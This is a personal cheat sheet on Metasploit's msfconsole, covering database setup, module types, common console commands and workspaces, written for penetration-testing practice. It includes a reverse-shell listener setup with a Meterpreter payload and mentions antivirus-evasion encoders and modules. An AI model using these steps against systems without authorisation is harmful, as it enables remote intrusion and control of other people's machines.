# Metasploit 
This as simple document condensing the usage of the `msfconsole`. For specific [[Meterpreter]] related follow the link for [[Proxying-with-metasploit]] follow this one. For a brief `msvenom` usage see [[Shells]]

## Introduction

[Metasploit](https://www.metasploit.com/) despite its nae sayers is an incredible tool making the figgly manual process more stream-line and less error prown. It's curation of exploit code helps address the issues with dangers of using public exploit code as well providing the utility of post exploit and enumeration tools in one console framework. Although for those post beginner phase I would recommend as was to me, learn the wonders of metasploit then do it manually, Exploit Frameworks like Metasploit are used because the reduce issues and complexity. It also Open-Source, although similar to Burpsuite in the respect that its core functionality is so very powerful that the commercial version is not really relevent to those that aren't professionals. Metasploit is even more overwhelming in features than Burpsuite Community the Pro version provides alot of features to the Open source version, as awesome as they are the path to learn to use something that makes it easy to not make mistakes is the reason that Metasploit is still awesome and you can learn, apply skill manually and use other tools for much of the [Pro version](https://www.rapid7.com/products/metasploit/download/editions/) offers. 

## Setup
Metasploit requires postgresql and requires Kali setup 
```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
sudo msfconsole -q
```

For ParrotOS [see](https://github.com/ParrotSec/metasploit-framework)
## Modules

Module Name | Description
--- | ---
Auxiliary |  Non-Exploit, like scanning, fuzzing, sniffing and enumeration against services
Encoders | Encoders will allow you to encode the exploit and payload for AV
Evasion | Anti-Virus Evasion modules
Exploits | `searchsploit` and `search` for Exploits
NOPs | Used in payload sizing, by keeping them consistent, to cause intended and not unintended side effect when attempting exploitation.
Payload | Single(one contiguous exploiation process), Stagers(Staged process setup connection to MS to receive Stages in ... stages), Stages(sent to the Stager)
Post | Post-Exploitation phase

## Simple and useful

Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```

## Commands

```msfconsole
background		# background a session
				# OR CTRL+Z
check			# check if system is vulnerable(SOME MODULES HAVE THIS)
exploit					# launch the exploit
	-z					# background exploit when run
info <module-name> 		# display inforamtion about <module-name>
						# -j for json, -d markdown
jobs					# display jobs
	–k					# kill jobID
	
options					# displays options
search					# searches
search type:<module>  	# search by module
search name:<name>	 	# search by name

session	<number>		# switch or refer to a session
sessions				# list all sessions
	-i					# interact with session number
set						# set data for options
setg					# set global data
show		# display parametres: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options 
				# module-specific: missing, advanced, evasion, targets, actions
use 			# select a module
```

## Database Access
```bash
services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at

db_status # View connection to metasploit database
workspace # -a to add -d to delete 
```

Workspace according to [Rapid7](https://docs.rapid7.com/metasploit/managing-workspaces/): *"Workspaces enable you to segment and manage the hosts and data stored in the database. You can use workspaces to create a logical separation for each segment that you want to test. For example, you may want to create a workspace for each subnet within an organization to limit the hosts to a specific network. Departments like HR, IT, and Accounting would each have its own workspace."*

## Auxiliary Modules Commands

```msfconsole
show auxiliary # see all auxiliary modules
```

## Exploit Module Commands

```msfconsole

show payloads 	# Check compatable payloads - VERY important
set payload 	# Assign payload choice to exploit
check			# Some exploit check if the provided <options> RHOST is vulnerable
```

## References

[Metasploit]https://www.metasploit.com/
[Github Metasploit ParrotOS](https://github.com/ParrotSec/metasploit-framework)
[OS Guide to setting up DB](https://www.offensive-security.com/metasploit-unleashed/using-databases/)
[Rapid7 Workspaces](https://docs.rapid7.com/metasploit/managing-workspaces/)